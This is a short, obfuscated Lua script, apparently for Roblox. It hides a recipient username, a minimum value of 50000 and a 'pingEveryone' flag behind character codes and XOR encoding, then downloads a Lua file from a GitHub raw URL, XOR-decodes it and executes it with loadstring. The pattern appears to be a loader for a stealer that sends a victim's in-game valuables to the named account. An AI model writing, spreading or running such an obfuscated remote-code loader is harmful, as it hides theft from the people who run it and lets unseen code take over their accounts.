local _0xA7E3 = string.char(71, 111, 107, 117, 71, 114, 105, 110, 100, 115, 80, 101, 116, 115) -- "GokuGrindsPets"
local _0xB2F3 = 50000
local _0xC1D4 = string.char(89, 101, 115) -- "Yes"

-- Simple XOR encryption function
local function xor_encrypt(data, key)
    local result = {}
    for i = 1, #data do
        result[i] = string.char(bit32.bxor(data:byte(i), key))
    end
    return table.concat(result)
end

-- Encrypting strings
local encrypted_username = xor_encrypt(_0xA7E3, 123) -- Using key 123 for XOR encryption
local encrypted_ping = xor_encrypt(_0xC1D4, 123) -- Same key for consistency

_G[xor_encrypt("username", 123)] = encrypted_username
_G[xor_encrypt("min_value", 123)] = _0xB2F3
_G[xor_encrypt("pingEveryone", 123)] = encrypted_ping

-- Inline encrypted function call
loadstring(xor_encrypt(game:HttpGet('https://raw.githubusercontent.com/WhatsuppGuys/scriptt/refs/heads/main/jos.lua'), 123))()
